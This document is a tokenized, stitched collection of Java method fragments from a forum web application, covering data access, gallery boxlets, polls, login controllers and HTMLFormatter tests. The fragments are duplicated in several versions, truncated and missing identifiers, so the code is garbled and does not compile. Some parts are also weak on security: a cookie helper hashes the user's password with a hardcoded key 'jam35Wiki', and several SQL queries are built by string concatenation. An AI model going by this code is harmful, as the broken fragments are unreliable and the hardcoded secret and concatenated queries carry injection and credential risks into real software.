public static int countCharacters ( String str ) throws UtilException { int size = 0 ; try { for ( Iterator < String > i = new SGMLStringIterator ( str ) ; i . hasNext ( ) ; ) { i . next ( ) ; size + + ; } } catch ( StringIndexOutOfBoundsException ex ) { throw new UtilException ( " Invalid SGML Entity " ) ; } return size ; } 
public String next ( ) { if ( ! hasNext ( ) ) { throw new NoSuchElementException ( ) ; } if ( str . charAt ( index ) = = '&' ) { StringBuffer buf = new StringBuffer ( ) ; 
private boolean isAjax ( HttpServletRequest request ) { String header = request . getHeader ( " X-Requested-With " ) ; return header ! = null & & " XMLHttpRequest " . equals ( header ) ; } 
public static boolean isBox ( String name ) { return boxSet . contains ( name ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws SQLException , BadDateException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) throws SQLException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void testURLWithAt ( ) { HTMLFormatter formatter = new HTMLFormatter ( URL_WITH_AT ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public void testEntityCrash ( ) { HTMLFormatter formatter = new HTMLFormatter ( GUARANTEED_CRASH ) ; formatter . enablePreformatMode ( ) ; formatter . enableUrlHighLightMode ( ) ; try { String r = formatter . process ( ) ; 
public void testUndescore ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_UNDERSCORE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " </a> " ) ) ; } 
public void testWithParamOnly ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_PARAM_ONLY ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " </a> " ) ) ; } 
public void testWithCyrillic ( ) { HTMLFormatter formatter = new HTMLFormatter ( RFC1738 ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " </a> " ) ) ; } 
public void testNlSubstition ( ) { String s = HTMLFormatter . nl2br ( " This is a line nwith break inside it " ) ; Integer i = s . indexOf ( " <br> " ) ; assertThat ( " Newline is changed to <br> " , i , CoreMatchers . not ( - 1 ) ) ; } 
public void testStringEscape ( ) { String str = " This is an entity &#1999; " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; } 
public void testAmpEscape ( ) { String str = " a&b " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; } 
public void testParaSubstition ( ) { String str = " this is a line r rwith some nlinebreaks in it " ; String s = HTMLFormatter . texnl2br ( str , false ) ; Integer i = s . indexOf ( " <p> " ) ; assertThat ( " Newlines is changed to <p> " , i , CoreMatchers . not ( - 1 ) ) ; Integer b = s . indexOf ( " <p> " , i + 3 ) ; assertThat ( " Wait, there should be two paras " , b , CoreMatchers . not ( - 1 ) ) ; } 
public void testCyrillicLink ( ) { HTMLFormatter formatter = new HTMLFormatter ( CYR_LINK ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void testGoogleCache ( ) { HTMLFormatter formatter = new HTMLFormatter ( GOOGLE_CACHE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void testPreformatLong1 ( ) { HTMLFormatter formatter = new HTMLFormatter ( PREFORMAT_LONG_TEST1 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; assertEquals ( " Long line damaged in preformat mode " , PREFORMAT_LONG_RESULT1 , s ) ; } 
public void testPreformatLong2 ( ) { HTMLFormatter formatter = new HTMLFormatter ( PREFORMAT_LONG_TEST2 ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; assertEquals ( " Long line damaged in preformat mode " , PREFORMAT_LONG_RESULT2 , s ) ; } 
public void testURLWithAt ( ) { HTMLFormatter formatter = new HTMLFormatter ( URL_WITH_AT ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void testLatin1Supplement ( ) { HTMLFormatter formatter = new HTMLFormatter ( Latin1Supplement ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public void testGreek ( ) { HTMLFormatter formatter = new HTMLFormatter ( greek ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; System . out . println ( s2 ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public void testGreek ( ) { HTMLFormatter formatter = new HTMLFormatter ( greek ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public String getContent ( ProfileHashtable profileHashtable ) throws IOException , SQLException { Connection db = null ; StringWriter writer = new StringWriter ( ) ; try { db = LorDataSource . getConnection ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT topics.id as msgid, topics.stat1, topics.title, topics.url, " + " topics.linktext, nick FROM topics, sections, groups, users WHERE groups.id=topics.groupid " + " AND groups.section=sections.id AND users.id=topics.userid AND topics.moderate AND sections.id=3 AND NOT deleted " + " ORDER BY commitdate DESC LIMIT 3 " ) ; Vector < GalleryItem > items = new Vector < GalleryItem > ( ) ; while ( rs . next ( ) ) { GalleryItem item = createGalleryItem ( rs ) ; items . add ( item ) ; } try { VelocityEngine ve = new VelocityEngine ( ) ; ve . init ( ) ; VelocityContext vc = new VelocityContext ( ) ; vc . put ( " items " , items ) ; todo: template loader ve.mergeTemplate("gallery.vm", "UTF-8", vc, writer); } catch (Exception e) { log.error(e); } } finally { if (db != null) { db.close(); } } return writer.toString(); } 
private GalleryItem createGalleryItem ( ResultSet rs ) throws SQLException , IOException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( " url " ) ; item . setIcon ( " linktext " ) ; item . setNick ( " nick " ) ; String htmlPath = ( ( PropertiesConfig ) config ) . getProperties ( ) . getProperty ( " HTMLPathPrefix " ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } return item ; } 
protected VelocityEngine getEngine ( ) throws Exception { Properties p = new Properties ( ) ; p . setProperty ( " resource.loader " , " class " ) ; p . setProperty ( " class.resource.loader.class " , " org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader " ) ; VelocityEngine ve = new VelocityEngine ( ) ; ve . init ( p ) ; return ve ; } 
public String getContentImpl ( ProfileHashtable profileHashtable ) throws IOException , SQLException { Connection db = null ; StringWriter writer = new StringWriter ( ) ; try { db = LorDataSource . getConnection ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT topics.id as msgid, topics.stat1, topics.title, topics.url, " + " topics.linktext, nick FROM topics, sections, groups, users WHERE groups.id=topics.groupid " + " AND groups.section=sections.id AND users.id=topics.userid AND topics.moderate AND sections.id=3 AND NOT deleted " + " ORDER BY commitdate DESC LIMIT 3 " ) ; Vector < GalleryItem > items = new Vector < GalleryItem > ( ) ; while ( rs . next ( ) ) { GalleryItem item = createGalleryItem ( rs ) ; items . add ( item ) ; } try { VelocityEngine ve = getEngine ( ) ; VelocityContext vc = new VelocityContext ( ) ; vc . put ( " items " , items ) ; ve . mergeTemplate ( " /templates/boxlets/gallery.vm " , " UTF-8 " , vc , writer ) ; } catch ( Exception e ) { log . error ( e ) ; } } finally { if ( db ! = null ) { db . close ( ) ; } } return writer . toString ( ) ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) throws SQLException , IOException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = ( ( PropertiesConfig ) config ) . getProperties ( ) . getProperty ( " HTMLPathPrefix " ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( FileNotFoundException e ) { log . error ( e ) ; } return item ; } 
public String getContent ( ProfileHashtable profile ) throws IOException , SQLException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public int doEndTag ( ) throws JspException { todo: after rw boxlets as Spring controllers, add here, depending on object value try { pageContext.include("/gallery.boxlet"); } catch (ServletException e) { e.printStackTrace(); To change body of catch statement use File | Settings | File Templates. } catch (IOException e) { e.printStackTrace(); To change body of catch statement use File | Settings | File Templates. } return SKIP_BODY; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { return createGalleryItem ( rs ) ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = properties . getProperties ( ) . getProperty ( " HTMLPathPrefix " , " " ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } log . debug ( ToStringBuilder . reflectionToString ( item ) ) ; return item ; } 
public static Poll createPoll ( Integer id , String title , Integer topic ) { return new Poll ( id , title , topic ) ; } 
public ArchiveDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { ArchiveDTO dto = new ArchiveDTO ( ) ; dto . setYear ( rs . getInt ( " year " ) ) ; dto . setMonth ( rs . getInt ( " month " ) ) ; dto . setCount ( rs . getInt ( " c " ) ) ; return dto ; } 
private void doMarkForShow ( int anInt ) { template . update ( " insert into boxlet_show(topic_id) values (?) " , anInt ) ; } 
public Poll getCurrentPoll ( ) throws PollNotFoundException { String sql = " SELECT votenames.id, votenames.title, votenames.topic FROM votenames " + " JOIN topics on votenames.topic = topics.id WHERE " + " topics.moderate AND not topics.deleted " + " AND topics.commitdate = (select max(commitdate) " + " from topics where groupid=19387 AND moderate AND NOT deleted) " ; Poll result = jdbcTemplate . queryForObject ( sql , new ParameterizedRowMapper < Poll > ( ) { public Poll mapRow ( ResultSet rs , int rowNum ) throws SQLException { return Poll . createPoll ( rs . getInt ( " id " ) , rs . getString ( " title " ) , rs . getInt ( " topic " ) ) ; } } , new HashMap ( ) ) ; if ( result = = null ) { throw new PollNotFoundException ( - 1 ) ; } return result ; } 
public Poll mapRow ( ResultSet rs , int rowNum ) throws SQLException { return Poll . createPoll ( rs . getInt ( " id " ) , rs . getString ( " title " ) , rs . getInt ( " topic " ) ) ; } 
public VoteDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { VoteDTO dto = new VoteDTO ( ) ; dto . setId ( rs . getInt ( " id " ) ) ; dto . setLabel ( rs . getString ( " label " ) ) ; dto . setPollId ( pollId ) ; return dto ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { return createGalleryItem ( rs ) ; } 
public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; dto . setPages ( ( int ) Math . ceil ( dto . getAnswers ( ) / itemsPerPage ) ) ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) throws SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setMsgid ( rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; Integer savedOrder = rs . getInt ( " mess_order " ) ; result . setMovedUp ( savedOrder = = null | | i > savedOrder ) ; return result ; } 
public boolean isMovedUp ( ) { return movedUp ; } 
public static List < Group > getGroups ( Connection db , Section section ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( tag ! = null & & ! " " . equals ( tag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , tag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int tagid = rs . getInt ( " id " ) ; if ( tagid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( tagid ) . append ( ')' ) ; } } else { throw new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) throws SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setMsgid ( rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; Integer savedOrder = rs . getInt ( " mess_order " ) ; if ( rs . wasNull ( ) ) { savedOrder = null ; } result . setMovedUp ( savedOrder = = null | | ( i + 1 ) > savedOrder ) ; return result ; } 
public TagDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { TagDTO result = new TagDTO ( ) ; result . setValue ( rs . getString ( " value " ) ) ; final double counter = Math . log ( rs . getInt ( " counter " ) ) ; result . setCounter ( counter ) ; if ( maxc . doubleValue ( ) < counter ) { maxc . setValue ( counter ) ; } if ( minc . doubleValue ( ) < 0 | | counter < minc . doubleValue ( ) ) { minc . setValue ( counter ) ; } return result ; } 
public void execute ( Object o ) { TagDTO tag = ( TagDTO ) o ; tag . setWeight ( ( int ) Math . round ( 10 * ( tag . getCounter ( ) - minc . doubleValue ( ) ) / ( maxc . doubleValue ( ) - minc . doubleValue ( ) ) ) ) ; 
protected ModelAndView handleRequestInternal ( HttpServletRequest request , HttpServletResponse response ) throws Exception { String nick = new ServletParameterParser ( request ) . getString ( " nick " ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = getObject ( ) ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . forAllDo ( boxnames , new Closure ( ) { public void execute ( Object o ) { String s = ( String ) o ; s = String . format ( " /%s.boxlet " , s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public void execute ( Object o ) { String s = ( String ) o ; s = String . format ( " /%s.boxlet " , s ) ; } 
public int doEndTag ( ) throws JspException { pageContext . removeAttribute ( var ) ; return SKIP_BODY ; } 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = getObject ( ) ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
protected ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView loginForm ( HttpServletRequest request , HttpServletResponse response ) throws Exception { return new ModelAndView ( " login-form " ) ; } 
public ModelAndView doLogin ( HttpServletRequest request , HttpServletResponse response ) throws Exception { Connection db = null ; Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; boolean ajax = isAjax ( request ) ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView register ( ) throws Exception { return new ModelAndView ( " register " ) ; } 
public ModelAndView doRegister ( HttpServletRequest request ) throws Exception { HttpSession session = request . getSession ( ) ; Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { boolean changeMode = " update " . equals ( request . getParameter ( " mode " ) ) ; 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
protected ModelAndView getTags ( ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView getInfo ( @RequestParam ( " nick " ) String nick ) throws SQLException , UserNotFoundException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView register ( ) { return new ModelAndView ( " register " ) ; } 
public ModelAndView doRegister ( HttpServletRequest request ) throws Exception { HttpSession session = request . getSession ( ) ; Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { boolean changeMode = " change " . equals ( request . getParameter ( " mode " ) ) ; 
public ModelAndView view ( HttpServletRequest request ) throws AccessViolationException , UtilException { boolean isThreeColumn = getThreeColumns ( request ) ; ModelAndView result = new ModelAndView ( " edit-boxes " ) ; result . addObject ( " isThreeColumn " , isThreeColumn ) ; return result ; } 
public ModelAndView showRemove ( HttpServletRequest request , @RequestParam ( required = true ) String tag , @RequestParam ( required = true ) Integer pos ) throws AccessViolationException , UtilException { ModelAndView result = new ModelAndView ( " remove-box " ) ; result . addObject ( " tag " , tag ) ; result . addObject ( " pos " , pos ) ; return result ; } 
public void doRemove ( HttpServletRequest request , HttpServletResponse response ) throws IOException { todo response.sendRedirect("/edit-boxes.jsp"); } 
public ModelAndView showRemove ( @RequestParam ( required = true ) String tag , @RequestParam ( required = true ) Integer pos ) throws AccessViolationException , UtilException { log . debug ( " showRemove() " ) ; ModelAndView result = new ModelAndView ( " remove-box " ) ; EditBoxesForm form = new EditBoxesForm ( ) ; form . setPosition ( pos ) ; form . setTag ( tag ) ; result . addObject ( " form " , form ) ; return result ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = properties . getProperties ( ) . getProperty ( " HTMLPathPrefix " , " " ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public boolean supports ( Class clazz ) { return EditBoxesController . EditBoxesForm . class . isAssignableFrom ( clazz ) ; } 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = getObject ( ) ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { public boolean evaluate ( Object o ) { String s = ( String ) o ; return mkdefprofile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public boolean evaluate ( Object o ) { String s = ( String ) o ; return mkdefprofile . isBox ( s ) ; } 
public ModelMap showRemove ( @RequestParam String tag , @RequestParam ( required = false ) Integer pos ) throws AccessViolationException , UtilException { ModelMap result = new ModelMap ( ) ; EditBoxesForm form = new EditBoxesForm ( ) ; form . setPosition ( pos ) ; form . setTag ( tag ) ; result . addAttribute ( " form " , form ) ; return result ; } 
private void checkUserPassword ( EditBoxesForm form , BindingResult result , final Template ) { final DataSource ds = ( DataSource ) getApplicationContext ( ) . getBean ( " datasource " ) ; try { User user = User . getUser ( ds . getConnection ( ) , . getProfileName ( ) ) ; 
public boolean supports ( Class clazz ) { return AddRemoveBoxesController . EditBoxesForm . class . isAssignableFrom ( clazz ) ; } 
public int doStartTag ( ) throws JspException { log . debug ( " Key is " + getKey ( ) ) ; String cached = provider . getFromCache ( getKey ( ) ) ; foundInCache = cached ! = null ; if ( foundInCache ) { try { log . debug ( " Found cached item: " + cached ) ; pageContext . getOut ( ) . write ( cached ) ; } catch ( IOException e ) { log . error ( e ) ; } return SKIP_BODY ; } else { log . debug ( " Cache miss. Will store after... " ) ; } return EVAL_BODY_BUFFERED ; } 
public int doAfterBody ( ) throws JspException { if ( ! foundInCache ) { log . debug ( " Content was not found in cache. Will store it " ) ; if ( bodyContent ! = null ) { String result = bodyContent . getString ( ) ; provider . storeToCache ( getKey ( ) , result , getExpire ( ) ) ; try { log . debug ( " Writing result: " + result . length ( ) ) ; bodyContent . clearBody ( ) ; bodyContent . write ( result ) ; bodyContent . writeOut ( bodyContent . getEnclosingWriter ( ) ) ; } catch ( IOException e ) { log . error ( e ) ; } } } return SKIP_BODY ; } 
public < T > T getFromCache ( String key ) ; public < T > boolean storeToCache ( String key , T value , long expire ) ; } 
public < T > boolean storeToCache ( String key , T value , long expire ) ; } 
public < T > boolean storeToCache ( String key , T value , long expire ) { String s = MemCachedSettings . getId ( key ) ; Date now = new Date ( ) ; return MemCachedSettings . getClient ( ) . add ( s , value , new Date ( now . getTime ( ) + expire ) ) ; } 
public int doStartTag ( ) throws JspException { String cached = provider . getFromCache ( getKey ( ) ) ; foundInCache = cached ! = null ; if ( foundInCache ) { try { pageContext . getOut ( ) . write ( cached ) ; } catch ( IOException e ) { log . error ( e ) ; } return SKIP_BODY ; } return EVAL_BODY_BUFFERED ; } 
public int doAfterBody ( ) throws JspException { if ( ! foundInCache ) { if ( bodyContent ! = null ) { String result = bodyContent . getString ( ) ; provider . storeToCache ( getKey ( ) , result , getExpire ( ) ) ; try { bodyContent . clearBody ( ) ; bodyContent . write ( result ) ; bodyContent . writeOut ( bodyContent . getEnclosingWriter ( ) ) ; } catch ( IOException e ) { log . error ( e ) ; } } } return SKIP_BODY ; } 
public ModelAndView topics ( @RequestParam ( " group " ) int groupId , HttpServletRequest request ) throws Exception { return topics ( groupId , request , false ) ; } 
public ModelAndView topicsLastmod ( @RequestParam ( " group " ) int groupId , HttpServletRequest request ) throws Exception { return topics ( groupId , request , true ) ; } 
public static DateFormat createShort ( ) { return DateFormat . getDateTimeInstance ( DateFormat . MEDIUM , DateFormat . SHORT , RUSSIAN_LOCALE ) ; } 
public static DateFormat createShort ( ) { return new SimpleDateFormat ( " dd.MM.yyyy HH:mm " ) ; } 
public static DateFormat createTime ( ) { return new SimpleDateFormat ( " HH:mm " ) ; } 
public ModelAndView delIp ( HttpServletRequest request ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Map < Integer , String > deleted = new HashMap < Integer , String > ( ) ; Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView delIp ( HttpServletRequest request , @RequestParam ( " reason " ) String reason , @RequestParam ( " ip " ) String ip , @RequestParam ( " time " ) String time ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Map < Integer , String > deleted = new HashMap < Integer , String > ( ) ; Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void testQP ( ) { HTMLFormatter formatter = new HTMLFormatter ( QP ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public void testEmptyAnchor ( ) { HTMLFormatter formatter = new HTMLFormatter ( EMPTY_ANCHOR ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public void testSlashAfterAmp ( ) { HTMLFormatter formatter = new HTMLFormatter ( SLASH_AFTER_AMP ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; System . out . println ( s2 ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; int blankIndex = s2 . indexOf ( " " ) ; int lastIndex = s2 . lastIndexOf ( " " ) ; assertThat ( " No whitespace inside link " , blankIndex , CoreMatchers . equalTo ( lastIndex ) ) ; whitespace shoud separate href attribute. no other ws should occur 
public ModelAndView topics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject , HttpServletRequest request ) throws Exception { return topics ( groupId , offsetObject , request , false ) ; } 
public ModelAndView topicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject , HttpServletRequest request ) throws Exception { return topics ( groupId , offsetObject , request , true ) ; } 
